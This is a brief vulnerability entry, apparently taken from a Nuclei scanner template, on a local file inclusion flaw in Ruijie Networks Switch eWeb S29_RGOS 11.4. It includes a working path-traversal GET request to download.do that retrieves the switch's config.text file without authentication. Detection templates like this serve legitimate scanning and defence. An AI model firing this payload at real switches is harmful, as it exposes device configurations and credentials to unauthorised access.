# Vulnerability: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`ruijie-networks-lfi.yaml`)

## Description
Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file inclusion and allows remote unauthenticated attackers to access locally stored files and retrieve their content via the 'download.do' endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/download.do?file=../../../../config.text
```

